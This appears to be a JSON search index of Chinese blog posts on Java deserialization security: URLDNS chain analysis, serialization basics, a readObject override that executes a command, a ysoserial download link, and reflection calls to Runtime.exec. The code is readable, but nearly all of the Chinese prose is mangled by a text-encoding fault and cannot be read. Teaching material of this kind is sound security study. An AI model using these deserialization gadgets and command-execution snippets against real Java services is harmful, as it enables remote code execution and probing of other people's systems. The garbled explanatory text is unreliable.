FileInputStream(\"dnsser.bin\"); ObjectInputStream objin=new ObjectInputStream(in); objin.readObject(); objin.close(); in.close(); } catch (Exception e) { e.printStackTrace(); } } }çœ‹ä¸Šé¢çš„æ³¨é‡Šåº”è¯¥ä¸éš¾ç†è§£è¿™ä¸²ä»£ç ã€‚å› ä¸ºä½¿HashMapé‡å†™äº†readObjectæ–¹æ³•ï¼Œæ¼æ´åœ¨å®ƒï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯åˆ›å»ºçš„å®ƒçš„å¯¹è±¡ï¼Œè°ƒç”¨å®ƒçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ–¹æ³•ã€‚ è¿›è¡Œè°ƒè¯•ï¼š çœ‹åˆ°åˆ°äº†writeObjectæ–¹æ³•è¿›è¡Œåºåˆ—åŒ–ã€‚ä¹Ÿå°±æ˜¯ysoserialç”Ÿæˆpayloadçš„æ­¥éª¤ã€‚ ç»§ç»­å‘ä¸‹ï¼š çœ‹åˆ°æ˜¯readObjectäº†ï¼Œè¿›è¡Œååºåˆ—åŒ–è§¦å‘é“¾å­äº†ï¼Œè¿™ä¸ªå°±ä¸åˆ†æäº†ï¼Œå’Œä¸Šé¢çš„ä¸€æ‘¸ä¸€æ ·ã€‚æœ€ååœ¨dnslogå¹³å°å¯ä»¥çœ‹åˆ°è¯·æ±‚ï¼š ä¹Ÿå¯ä»¥è¿›è¡Œå­—èŠ‚çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼š import java.io.*; import java.net.URL; import java.util.HashMap; import java.lang.reflect.Field; public class URLDemo { public static void main(String[] args)throws Exception{ HashMap hashMap = new HashMap(); URL url = new URL(\"http://2faede01.log.dnslog.biz.\"); Field f = Class.forName(\"java.net.URL\").getDeclaredField(\"hashCode\"); f.setAccessible(true); f.set(url, 10086); hashMap.put(url, \"gaoren\"); f.set(url, -1); System.out.println(hashMap); try { ByteArrayOutputStream out=new ByteArrayOutputStream(); ObjectOutputStream objout=new ObjectOutputStream(out); objout.writeObject(hashMap); objout.close(); out.close(); byte[] ObjectBytes=out.toByteArray(); ByteArrayInputStream in=new ByteArrayInputStream(ObjectBytes); ObjectInputStream objin=new ObjectInputStream(in); objin.readObject(); objin.close(); in.close(); } catch (Exception e) { e.printStackTrace(); } } }å¦‚æœæœ‰ç”Ÿæˆçš„payloadæƒ³è¿›è¡ŒéªŒè¯ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä¹‹æ„é€ ååºåˆ—åŒ–çš„æ–¹æ³•ï¼š import java.io.*; public class main { public static void main(String[] args) throws IOException, ClassNotFoundException { FileInputStream fis = new FileInputStream(\"out.bin\"); ObjectInputStream bit = new ObjectInputStream(fis); bit.readObject(); } }è·Ÿè¸ªè°ƒè¯•ï¼Œæ•ˆæœæ˜¯ä¸€æ ·çš„ã€‚ å‚è€ƒï¼š https://www.cnblogs.com/nice0e3/p/13772184.html#0x03-urldns%E9%93%BE%E5%88%86%E6%9E%90 https://www.anquanke.com/post/id/261724#h3-10 https://www.cnblogs.com/gk0d/p/16874157.html https://www.freebuf.com/articles/web/327710.html https://xz.aliyun.com/t/9417?time__1311=n4%2BxuDgD9AYCqGKDQeDsR32Ehei%3DttDRCBoD\u0026alichlgref=https%3A%2F%2Fwww.bing.com%2F#toc-1 ","date":"2024-06-05","objectID":"/posts/urldns%E9%93%BE%E5%88%86%E6%9E%90/:5:0","tags":["java","ååºåˆ—åŒ–"],"title":"URLDNSé“¾åˆ†æ","uri":"/posts/urldns%E9%93%BE%E5%88%86%E6%9E%90/"},{"categories":["javasec"],"content":"åºåˆ—åŒ–ååºåˆ—åŒ–åŸºç¡€ åœ¨Javaè¯­è¨€ä¸­ï¼Œå®ç°åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„ç±»ï¼š ä½ç½®ï¼š Java.io.ObjectOutputStream java.io.ObjectInputStream åºåˆ—åŒ–ï¼š ObjectOutputStreamç±» â€“\u003e writeObject() æ³¨ï¼šè¯¥æ–¹æ³•å¯¹å‚æ•°æŒ‡å®šçš„objå¯¹è±¡è¿›è¡Œåºåˆ—åŒ– ï¼ŒæŠŠå­—èŠ‚åºåˆ—å†™åˆ°ä¸€ä¸ªç›®æ ‡è¾“å‡ºæµä¸­ï¼ŒæŒ‰Javaçš„æ ‡å‡†çº¦å®šæ˜¯ç»™æ–‡ä»¶ä¸€ä¸ª.seræ‰©å±•å ååºåˆ—åŒ–:ã€€ObjectInputStreamç±» â€“\u003e readObject() æ³¨ï¼šè¯¥æ–¹æ³•ä»ä¸€ä¸ªæºè¾“å…¥æµä¸­è¯»å–å­—èŠ‚åºåˆ—ï¼Œå†æŠŠå®ƒä»¬ååºåˆ—åŒ–ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶å°†å…¶è¿”å›ã€‚ javaåœ¨åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œä¼šè°ƒç”¨writeObjectæ–¹æ³•ï¼Œå‚æ•°ç±»å‹æ—¶ObjectOutputStreamï¼Œå¼€å‘è€…å¯ä»¥å°†ä»»ä½•å†…å®¹å†™å…¥è¿™ä¸ªStreamä¸­ï¼›ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨readObjectï¼Œå¯ä»¥ä»ä¸­è¯»å–åˆ°å‰é¢å†™å…¥çš„å†…å®¹ï¼Œå¹¶è¿›è¡Œå¤„ç†ã€‚ å­—ç¬¦ä¸²åºåˆ—åŒ–: import java.io.*; public class Main implements Serializable { //å®šä¹‰åºåˆ—åŒ–çš„æ–¹æ³•å—ï¼Œå°†å¯¹è±¡è½¬åŒ–ä¸ºå­—èŠ‚æµ public static byte[] serialize(final Object obj) throws IOException { ByteArrayOutputStream out = new ByteArrayOutputStream(); //åˆ›å»ºä¸€ä¸ªå­—èŠ‚æ•°ç»„è¾“å‡ºæµ ObjectOutputStream objOut = new ObjectOutputStream(out); //åˆ›å»ºå¯¹è±¡è¾“å‡ºæµ objOut.writeObject(obj); //å°†ä¼ å…¥å¯¹è±¡è¿›è¡Œåºåˆ—åŒ– System.out.println(out.toString()); //æ‰“å°åºåˆ—åŒ–å†…å®¹ return out.toByteArray(); //è½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ //æ‰€ä»¥åºåˆ—åŒ–ä¸€å¼€å§‹å°±æ˜¯åˆ›å»ºè¾“å‡ºæµï¼Œå¯ä»¥æ˜¯å­—èŠ‚æ–‡ä»¶ã€å­—èŠ‚æ•°ç»„æˆ–è€…å­—èŠ‚æµï¼Œç„¶åå†åˆ›å»ºå¯¹è±¡è¾“å‡ºæµï¼Œæœ€åè°ƒç”¨writeObjectè¿›è¡Œåºåˆ—åŒ–ï¼Œè¿˜å¯ä»¥å°†å¯¹è±¡æµè½¬æ¢ä¸ºå­—èŠ‚æµè¿›è¡Œè¿”å›ã€‚ } //å®šä¹‰ååºåˆ—åŒ–çš„æ–¹æ³•ï¼Œå°†å­—èŠ‚æµè½¬åŒ–ä¸ºå¯¹è±¡ public static Object deserialize(byte[] serialized) throws IOException, ClassNotFoundException { ByteArrayInputStream in = new ByteArrayInputStream(serialized);//å°†å­—èŠ‚æ•°ç»„è½¬åŒ–ä¸ºå­—èŠ‚è¾“å…¥æµ ObjectInputStream objIn = new ObjectInputStream(in);//åœ¨å°†å­—èŠ‚è¾“å…¥æµåˆå§‹åŒ–ä¸ºå¯¹è±¡è¾“å…¥æµ return objIn.readObject(); //è¿”å›ååºåˆ—åŒ–å¯¹è±¡ //ååºåˆ—åŒ–å°±æ˜¯å°†å­—èŠ‚æµå…ˆå˜ä¸ºå­—èŠ‚è¾“å…¥æµï¼Œç„¶åå†æ˜¯å¯¹è±¡è¾“å…¥æµï¼Œæœ€åè¿›è¡Œååºåˆ—åŒ–ã€‚ } public static void main(String[] args) throws IOException, ClassNotFoundException { String s = \"hello\"; byte[] ObjectBytes=serialize(s); String after = (String) deserialize(ObjectBytes); //æŠŠå¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸² System.out.println(after); } }è¿è¡Œç»“æœï¼š å‘ç°é€šè¿‡å­—èŠ‚æ¥çœ‹åºåˆ—åŒ–å†…å®¹å¯è¯»æ€§å¤ªä½äº†ï¼Œå¯ä»¥æŠŠåºåˆ—åŒ–å†…å®¹å†™å…¥æ–‡ä»¶ä¸­ï¼š import java.io.*; public class Main implements Serializable { //å®šä¹‰åºåˆ—åŒ–çš„æ–¹æ³•å—ï¼Œå°†å¯¹è±¡è½¬åŒ–ä¸ºå­—èŠ‚æµ public static void serialize(final Object obj) throws IOException { FileOutputStream files=new FileOutputStream(\"ser.bin\"); //åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ç±»å‹å¯¹è±¡ ObjectOutputStream objfiles = new ObjectOutputStream(files); //å¹¶å°†æ–‡ä»¶ç±»å‹å¯¹è±¡ä½œä¸ºåºåˆ—åŒ–æ—¶å†™å…¥çš„ä½ç½® objfiles.writeObject(obj); //å°†ä¼ å…¥å¯¹è±¡è¿›è¡Œåºåˆ—åŒ– } public static void main(String[] args) throws IOException, ClassNotFoundException { String s = \"hello\"; serialize(s); } } å¯¹è±¡åºåˆ—åŒ–ï¼š å’Œå­—ç¬¦ä¸²åºåˆ—åŒ–å·®ä¸å¤š import java.io.*; public class Main implements Serializable { //å®šä¹‰åºåˆ—åŒ–çš„æ–¹æ³•å—ï¼Œå°†å¯¹è±¡è½¬åŒ–ä¸ºå­—èŠ‚æµ public static byte[] serialize(final Object obj) throws IOException { ByteArrayOutputStream out = new ByteArrayOutputStream(); //åˆ›å»ºä¸€ä¸ªå­—èŠ‚è¾“å‡ºæµå¯¹è±¡ ObjectOutputStream objOut = new ObjectOutputStream(out); //å¹¶å°†å­—èŠ‚è¾“å‡ºæµå¯¹è±¡ä½œä¸ºåºåˆ—åŒ–æ—¶å†™å…¥çš„ä½ç½® objOut.writeObject(obj); //å°†ä¼ å…¥å¯¹è±¡è¿›è¡Œåºåˆ—åŒ– System.out.println(out.toString());//æ‰“å°åºåˆ—åŒ–å†…å®¹ return out.toByteArray(); } //å®šä¹‰ååºåˆ—åŒ–çš„æ–¹æ³•ï¼Œå°†å­—èŠ‚æµè½¬åŒ–ä¸ºå¯¹è±¡ public static Object deserialize(byte[] serialized) throws IOException, ClassNotFoundException { ByteArrayInputStream in = new ByteArrayInputStream(serialized);//å°†å­—èŠ‚æ•°ç»„è½¬åŒ–ä¸ºå­—èŠ‚è¾“å…¥æµ ObjectInputStream objIn = new ObjectInputStream(in);//æ”¾å…¥ObjectInputStreamå¯¹è±¡ä¸­å¾…åºåˆ—åŒ– return objIn.readObject().getClass(); //readObject()å°±èƒ½è¿”å›åºåˆ—åŒ–å¯¹è±¡ï¼ŒåŠ ä¸ªgetClass()æ›´ç›´è§‚ } public static void main(String[] args) throws IOException, ClassNotFoundException { People people = new People(\"ZhangSan\", \"boy\", 18);//Peopleå¯¹è±¡ï¼Œéœ€è¦åœ¨åˆ›ä¸ªPeople.javaæ–‡ä»¶ byte[] ObjectBytes=serialize(people); Object after = deserialize(ObjectBytes); System.out.println(after); } }ç»“æœï¼š ä¾ç„¶å¯ä»¥å†™å…¥æ–‡ä»¶ï¼š import java.io.*; public class SerializableTest { public static void serialize(Object obj) throws Exception{ ObjectOutputStream files=new ObjectOutputStream(new FileOutputStream(\"ser2.bin\")); files.writeObject(obj); } public static void main(String[] args) throws Exception{ People people = new People(\"ZhangSan\", \"boy\", 18); serialize(people); } } æ³¨æ„ç‚¹ï¼š å®ç°Serializableå’ŒExternalizableæ¥å£çš„ç±»çš„å¯¹è±¡æ‰èƒ½è¢«åºåˆ—åŒ–ï¼Œæœ€ä¸‹é¢æœ‰è§£é‡Šã€‚ Externalizable æ¥å£ç»§æ‰¿è‡ª Serializable æ¥å£ï¼Œå®ç°Externalizableæ¥å£çš„ç±»å®Œå…¨ç”±è‡ªèº«æ¥æ§åˆ¶åºåˆ—åŒ–çš„è¡Œä¸ºï¼Œè€Œä»…å®ç°Serializableæ¥å£çš„ç±»å¯ä»¥é‡‡ç”¨é»˜è®¤çš„åºåˆ—åŒ–æ–¹å¼ã€‚ å®ç°java.io.Serializableæ¥å£æ‰å¯è¢«ååºåˆ—åŒ–ï¼Œè€Œä¸”æ‰€æœ‰å±æ€§å¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„(ç”¨transient å…³é”®å­—ä¿®é¥°çš„å±æ€§é™¤å¤–ï¼Œä¸å‚ä¸åºåˆ—åŒ–è¿‡ç¨‹) å¯¹è±¡åºåˆ—åŒ–åŒ…æ‹¬å¦‚ä¸‹æ­¥éª¤ï¼š 1ã€åˆ›å»ºä¸€ä¸ªå¯¹è±¡è¾“å‡ºæµï¼Œå®ƒå¯ä»¥åŒ…è£…ä¸€ä¸ªå…¶ä»–ç±»å‹çš„ç›®æ ‡è¾“å‡ºæµï¼Œå¦‚æ–‡ä»¶è¾“å‡ºæµï¼› 2ã€é€šè¿‡å¯¹è±¡è¾“å‡ºæµçš„writeObject()æ–¹æ³•å†™å¯¹è±¡ã€‚å¯¹è±¡ååºåˆ—åŒ–çš„æ­¥éª¤å¦‚ä¸‹ï¼š 1ã€åˆ›å»ºä¸€ä¸ªå¯¹è±¡è¾“å…¥æµï¼Œå®ƒå¯ä»¥åŒ…è£…ä¸€ä¸ªå…¶ä»–ç±»å‹çš„æºè¾“å…¥æµï¼Œå¦‚æ–‡ä»¶è¾“å…¥æµï¼› 2ã€é€šè¿‡å¯¹è±¡è¾“å…¥æµçš„readObject()æ–¹æ³•è¯»å–å¯¹è±¡ã€‚","date":"2024-06-03","objectID":"/posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:1:0","tags":["java","ååºåˆ—åŒ–"],"title":"javaååºåˆ—åŒ–","uri":"/posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"categories":["javasec"],"content":"javaååºåˆ—åŒ–æ¼æ´ åŸç†ï¼š å¦‚æœJavaåº”ç”¨å¯¹ç”¨æˆ·è¾“å…¥ï¼Œå³ä¸å¯ä¿¡æ•°æ®åšäº†ååºåˆ—åŒ–å¤„ç†ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„è¾“å…¥ï¼Œè®©ååºåˆ—åŒ–äº§ç”Ÿéé¢„æœŸçš„å¯¹è±¡ï¼Œéé¢„æœŸçš„å¯¹è±¡åœ¨äº§ç”Ÿè¿‡ç¨‹ä¸­å°±æœ‰å¯èƒ½å¸¦æ¥ä»»æ„ä»£ç æ‰§è¡Œã€‚ä»ä¸Šé¢å¯ä»¥çœ‹åˆ°javaåºåˆ—åŒ–å†…å®¹ç›¸æ¯”phpè¿˜æ˜¯æ¯”è¾ƒéš¾è¯»çš„ï¼Œæ‰€ä»¥å¾ˆéš¾ç›´æ¥æ„é€ æ¶æ„å‘½ä»¤ï¼Œä½†ä¾ç„¶å¯ä»¥é€šè¿‡é‡å†™readObjectæ¥è¿›è¡Œæ¼æ´åˆ©ç”¨ã€‚ åˆ©ç”¨ï¼š æˆ‘ä»¬å¯ä»¥åœ¨Peopleç±»ä¸­é‡å†™readObjectæ–¹æ³•ã€‚ private void readObject(java.io.ObjectInputStream ois) throws java.io.IOException,ClassNotFoundException{ ois.defaultReadObject(); //é»˜è®¤è¿›è¡Œååºåˆ—åŒ– Runtime.getRuntime().exec(\"calc.exe\");//å¤šæ‰§è¡Œçš„å‘½ä»¤ }è¿è¡Œï¼š é‚£å¯èƒ½ä¼šå¥½å¥‡ä¸ºä»€ä¹ˆè¿™é‡Œé‡å†™äº†å¦‚readObjectçš„æ–¹æ³•å°±ä¼šæ‰§è¡Œè¿™ä¸ªreadObjectæ–¹æ³•å‘¢ï¼ŒåŒæ ·åœ¨æœ€ä¸‹é¢è¿›è¡Œäº†è§£é‡Šã€‚ ","date":"2024-06-03","objectID":"/posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:2:0","tags":["java","ååºåˆ—åŒ–"],"title":"javaååºåˆ—åŒ–","uri":"/posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"categories":["javasec"],"content":"ysoserialå·¥å…· ysoserialæ˜¯javaååºåˆ—åŒ–æ¼æ´çš„ä¸€ä¸ªå·¥å…·ã€‚å¯ä»¥ç›´æ¥ä¸‹è½½ç¼–è¯‘å¥½çš„jaræ–‡ä»¶ï¼Œç›´æ¥å°±èƒ½ç”¨ã€‚ https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jaræˆ–è€…ä¸‹è½½æºç è‡ªå·±è¿›è¡Œç¼–è¯‘ï¼Œå»ºè®®è¿™æ ·åšå› ä¸ºæ–¹ä¾¿æŸ¥çœ‹ poc çš„æºç ã€‚ ","date":"2024-06-03","objectID":"/posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:3:0","tags":["java","ååºåˆ—åŒ–"],"title":"javaååºåˆ—åŒ–","uri":"/posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"categories":["javasec"],"content":"ååºåˆ—åŒ–åº•å±‚åˆ†æ å‚è€ƒï¼šhttps://www.cnblogs.com/yyhuni/p/15127416.html ååºåˆ—åŒ–çš„ demoï¼Œ package org.example; import java.io.*; public class sertest { public static void main(String[] args) throws Exception{ people p=new people(\"gaoren\"); ser(p); deser(\"test.bin\"); } public static class people implements Serializable{ private String name; people (String name){ this.name=name; } } public static void ser(Object obj)throws Exception{ FileOutputStream out=new FileOutputStream(\"test.bin\"); ObjectOutputStream objout=new ObjectOutputStream(out); objout.writeObject(obj); } public static void deser(String filename)throws Exception{ FileInputStream in =new FileInputStream(filename); ObjectInputStream objin=new ObjectInputStream(in); Object obj=objin.readObject(); } }ç„¶ååˆ©ç”¨ SerializationDumper æŸ¥çœ‹ç”Ÿæˆçš„å­—èŠ‚æµï¼Œ java -jar SerializationDumper-v1.13.jar -r test.bin TC_OBJECTï¼šæ ‡è®°åé¢çš„æ•°æ®ä¸ºObjectå¯¹è±¡ TC_CLASSDESCï¼šç±»æè¿°ç¬¦æ ‡è¯†ï¼Œè¡¨ç¤ºä¸€ä¸ªç±»ä¸­çš„æ‰€æœ‰ä¿¡æ¯ ","date":"2024-06-03","objectID":"/posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:4:0","tags":["java","ååºåˆ—åŒ–"],"title":"javaååºåˆ—åŒ–","uri":"/posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"categories":["javasec"],"content":"è°ƒè¯•åˆ†æ åœ¨ Object obj=objin.readObject(); å¤„ä¸‹ä¸ªæ–­ç‚¹ï¼Œä¸€è·¯è·Ÿåˆ° ObjectInputStream#readObject æ–¹æ³•ï¼Œåœ¨å…¶ä¸­è°ƒç”¨äº† readObject0 è·Ÿè¿›ï¼Œåœ¨æ­¤å‡½æ•°ä¸­ï¼Œæ ¹æ®äº†tcå€¼æ¥è¿›è¡Œswitchï¼Œæ­¤æ—¶çš„tcå€¼ä¸ºTC_OBJECTï¼Œä¹Ÿå°±æ˜¯0x73åè¿›åˆ¶æ•°115 ç„¶ååœ¨ case TC_OBJECT ä¸­ï¼Œè°ƒç”¨äº† readOrdinaryObjectï¼Œ è·Ÿè¿›readOrdinaryObjectä¸­ï¼Œå‘ç°è°ƒç”¨äº†readClassDescæ–¹æ³•ï¼Œå¹¶æŠŠå€¼èµ‹ç»™äº†desc ç»§ç»­è·Ÿè¿› readClassDescï¼Œæ­¤æ–¹æ³•ç”¨æ¥åˆ†å‘å¤„ç†å­—èŠ‚æµä¸­ TC_CLASSDESC çš„æ–¹æ³•ï¼Œç”¨switchæ¥é€‰æ‹©éœ€è¦å¤„ç†çš„æ–¹æ³•ï¼Œè¿™é‡Œtcçš„å€¼å°±æ˜¯ TC_CLASSDESC çš„å€¼0x72ï¼Œè½¬æˆ10è¿›åˆ¶å°±æ˜¯114ï¼Œç„¶åè¿›å…¥switchåˆ¤æ–­åè½¬åˆ° case TC_CLASSDESC: è·Ÿè¿›åˆ° readNonProxyDesc æ–¹æ³•ä¸­ï¼Œè°ƒç”¨äº†resolveClass å† resolveClass ä¸­ï¼Œé€šè¿‡ Class.forName æ¥å®ä¾‹åŒ–äº† people å¯¹è±¡ï¼Œç„¶åè¿”å›å¯¹è±¡ã€‚ å›åˆ° readNonProxyDesc æ–¹æ³•ä¸­ï¼Œæ—¶clå€¼å˜æˆäº† people å¯¹è±¡ï¼Œç„¶åæŠŠclå¯¹è±¡ä¼ å…¥äº† initNonProxyï¼Œå¹¶ä¸”èµ‹å€¼ç»™äº†descï¼Œ ç„¶åè¿”å› desc èµ‹å€¼ç»™äº†descriptor æœ€åå›åˆ° readOrdinaryObject æ–¹æ³•ä¸­ï¼Œæ­¤æ—¶çš„ desc å·²ç»æ˜¯ people å¯¹è±¡äº†ã€‚ æ€»ç»“ä¸‹ä¸Šé¢çš„æµç¨‹é¡ºåºä¸ºï¼š readOrdinaryObject -ã€‹ readClassDesc -ã€‹ readNonProxyDesc -ã€‹ resolveClassï¼Œ readClassDescï¼šåˆ†å‘ç”¨äºå¤„ç†å­—èŠ‚æµä¸­TC_CLASSDESCçš„æ–¹æ³•ï¼Œç”¨switchæ¥é€‰æ‹©éœ€è¦å¤„ç†çš„æ–¹æ³• readNonProxyDescï¼šçœŸæ­£ç”¨æ¥å¤„ç†å­—èŠ‚æµä¸­çš„TC_CLASSDESCæ–¹æ³•ï¼Œä¼šè°ƒç”¨resolveClassè¿›è¡Œåˆ›å»ºååºåˆ—åŒ–çš„å¯¹è±¡ resolveClassï¼šæ˜¯ç”¨Class.forNameæ¥åˆ›å»ºObjectAå¯¹è±¡çš„åœ°æ–¹ï¼Œåœ¨è¿™é‡Œå¯ä»¥åšä¸€ä¸ªæ£€æŸ¥æ ¡éªŒï¼Œç”¨äºååºåˆ—åŒ–æ‹¦æˆªã€‚weblogicä¸­è¡¥ä¸æ‹¦æˆªå°±æ˜¯åœ¨æ­¤è¿›è¡Œçš„ ç„¶åæ˜¯ readOrdinaryObjectï¼Œè¿™é‡Œçš„ readOrdinaryObject å°±æ˜¯çœŸæ­£æ“ä½œè°ƒç”¨åºåˆ—åŒ–ç±»ä¸­ï¼ŒreadObjectã€readResolveã€readExternalæ–¹æ³•çš„åœ°æ–¹ï¼Œ æ¥ç€ä¸Šé¢debugï¼Œæ‹¿åˆ°äº†descçš„å€¼åå¾€ä¸‹èµ°ï¼Œåšäº†ä¸€ä¸ªåˆ¤æ–­ desc.isExternalizableï¼Œå¦‚æœåºåˆ—åŒ–çš„æ¥å£æ˜¯Externalizableç±»å‹ï¼Œå°±è¿›å…¥readExternalDataï¼Œå¦åˆ™è¿›å…¥readSerialData æ­¤å¤„çš„ people å¯¹è±¡æ¥å£ç±»å‹æ˜¯Serializableï¼Œæ‰€ä»¥è¿›å…¥äº† readSerialData æ–¹æ³•ï¼Œ æœ€å readSerialData æ–¹æ³•ä¸­ç”¨äº†åå°„è¿›è¡Œè°ƒç”¨ååºåˆ—åŒ–å¯¹è±¡çš„ readObject æ–¹æ³• åˆ°readOrdinaryObjectï¼Œæ¥ä¸‹æ¥å°±æ˜¯è°ƒç”¨readResolveæ–¹æ³•çš„åœ°æ–¹äº† ç”¨ifè¿›è¡Œåˆ¤æ–­ï¼Œä¸ºtrueåˆ™ç”¨åå°„è°ƒç”¨ååºåˆ—åŒ–å¯¹è±¡çš„ readResolve æ–¹æ³•ï¼Œè¿™é‡Œæ²¡æœ‰é‡å†™æ­¤æ–¹æ³•æ‰€ä»¥ä¸º falseï¼Œ æœ€åå›åˆ° readObject0ï¼Œ åˆ°è¿™é‡Œå°±æ˜¯ååºåˆ—åŒ–çš„åº•å±‚é€»è¾‘äº†ï¼Œæ‰€ä»¥éœ€è¦ç»§æ‰¿ Serializable æ¥å£ï¼Œç„¶åä¼šåå°„è°ƒç”¨ååºåˆ—åŒ–å¯¹è±¡çš„ readobject æ–¹æ³•ã€‚ ","date":"2024-06-03","objectID":"/posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:4:1","tags":["java","ååºåˆ—åŒ–"],"title":"javaååºåˆ—åŒ–","uri":"/posts/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"categories":["javasec"],"content":"åŸºç¡€å†…å®¹ åå°„è°ƒç”¨å°±æ˜¯æŒ‡é€šè¿‡åå°„æœºåˆ¶è¿›è¡Œçš„æ–¹æ³•è°ƒç”¨ã€‚åå°„æœºåˆ¶æ˜¯Javaç¼–ç¨‹è¯­è¨€çš„ä¸€ä¸ªé‡è¦ç‰¹æ€§ï¼Œå®ƒå…è®¸ç¨‹åºåœ¨è¿è¡Œæ—¶æ£€æŸ¥ã€æ“ä½œå’Œå®ä¾‹åŒ–ç±»ï¼Œæ–¹æ³•ï¼Œå­—æ®µç­‰ï¼Œå¹¶åœ¨è¿è¡Œæ—¶è·å–ç±»çš„ä¿¡æ¯ä»¥åŠåŠ¨æ€è°ƒç”¨ç±»çš„æ–¹æ³•ã€‚åå°„æœºåˆ¶ä½¿å¾—Javaç¨‹åºå¯ä»¥åœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°åŠ è½½ã€æ¢æµ‹å’Œä½¿ç”¨ç±»ï¼Œè€Œä¸éœ€è¦åœ¨ç¼–è¯‘æ—¶å°±çŸ¥é“è¿™äº›ç±»çš„å…·ä½“ä¿¡æ¯ã€‚ é€šè¿‡åå°„æœºåˆ¶ï¼Œå¯ä»¥å®ç°ä»¥ä¸‹åŠŸèƒ½ï¼š è·å–ç±»çš„ä¿¡æ¯ï¼šå¯ä»¥åœ¨è¿è¡Œæ—¶è·å–ç±»çš„ä¿¡æ¯ï¼Œå¦‚ç±»çš„åç§°ã€çˆ¶ç±»ã€æ¥å£ã€æˆå‘˜å˜é‡ã€æ–¹æ³•ç­‰ã€‚ å®ä¾‹åŒ–ç±»ï¼šå¯ä»¥é€šè¿‡ç±»çš„åç§°åŠ¨æ€å®ä¾‹åŒ–ç±»çš„å¯¹è±¡ã€‚ è°ƒç”¨æ–¹æ³•ï¼šå¯ä»¥é€šè¿‡æ–¹æ³•ååŠ¨æ€è°ƒç”¨ç±»çš„æ–¹æ³•ã€‚ è·å–å­—æ®µä¿¡æ¯ï¼šå¯ä»¥é€šè¿‡å­—æ®µåè·å–ç±»çš„å­—æ®µä¿¡æ¯ã€‚ åŠ¨æ€ä»£ç†ï¼šå¯ä»¥åœ¨è¿è¡Œæ—¶åŠ¨æ€ç”Ÿæˆä»£ç†ç±»ï¼Œå®ç°ä»£ç†ç›¸å…³çš„åŠŸèƒ½ã€‚ ","date":"2024-06-03","objectID":"/posts/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/:1:0","tags":["java"],"title":"javaåå°„æœºåˆ¶","uri":"/posts/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"},{"categories":["javasec"],"content":"javaåŸºæœ¬åå°„è°ƒç”¨ åå°„è°ƒç”¨ä¸€èˆ¬åˆ†ä¸º4ä¸ªæ­¥éª¤ï¼š ç±»çš„å®ä¾‹åŒ– å¾—åˆ°è¦è°ƒç”¨ç±»çš„class å¾—åˆ°è¦è°ƒç”¨çš„ç±»ä¸­çš„æ–¹æ³•(Method) æ–¹æ³•è°ƒç”¨(invoke) obj.getClass()è·å¾—ç±»ï¼š demoï¼š import java.lang.reflect.Method; public class Main{ public static void main(String[] args) throws Exception{ Reflect r1= new Reflect(); //å¯¹ç±»è¿›è¡Œæ˜¯å®ä¾‹åŒ– r1.print(1,3); //ç›´æ¥è°ƒç”¨ Class c = r1.getClass(); //è·å–å®åˆ—åŒ–å¯¹è±¡æ‰€å±ç±»çš„ç±»çš„å¯¹è±¡ Method m1 = c.getMethod(\"print\",int.class,int.class); //è·å¾—æ–¹æ³• Object i = m1.invoke(r1, 1, 2); //åå°„æœºåˆ¶è°ƒç”¨æ–¹æ³• } } class Reflect{ public void print(int a,int b){ System.out.println(a+b); } }ä¸Šé¢åˆ†åˆ«æ˜¯ä¸¤ç§è°ƒç”¨ç±»çš„æ–¹æ³•çš„æ–¹æ³• ç¬¬ä¸€ç§æ˜¯é€šè¿‡ç±»çš„å®ä¾‹åŒ–ç›´æ¥è°ƒç”¨ï¼Œ ç¬¬äºŒç§æ˜¯é€šè¿‡ç±»çš„å¯¹è±¡ç”¨getMethodè·å¾—æ–¹æ³•ï¼Œç„¶ååˆ©ç”¨åå°„æœºåˆ¶è°ƒç”¨æ–¹æ³•ï¼› è‡³äºä¸€äº›å‡½æ•°çš„å…·ä½“ä½¿ç”¨å¦‚getClassï¼ŒgetMethod,invokeå¯ä»¥ç›´æ¥é—®gptã€‚ åŠ ä¸Šthrows Exceptionæ˜¯å› ä¸ºgetMethod()å’Œinvoke()æ–¹æ³•ä¼šæŠ›å‡ºNoSuchMethodExceptionã€IllegalAccessExceptionã€IllegalArgumentExceptionç­‰å¼‚å¸¸ï¼Œå¯ä»¥å»æ‰çœ‹çœ‹æŠ¥é”™ã€‚ é‚£ä¹ˆå¯ä»¥åˆ©ç”¨è¿™ç§åå°„è°ƒç”¨æ¥è°ƒç”¨æ¶æ„ç±»å®ç°rceï¼š import java.lang.reflect.Method; public class Main{ public static void main(String[] args)throws Exception { Runtime runtime=Runtime.getRuntime(); //è·å¾—Runtimeçš„å®ä¾‹åŒ– runtime.exec(\"calc.exe\"); //å®åˆ—åŒ–ç›´æ¥è°ƒç”¨ Class c=runtime.getClass(); Method m1=c.getMethod(\"exec\",String.class); Object i=m1.invoke(runtime,\"calc.exe\"); 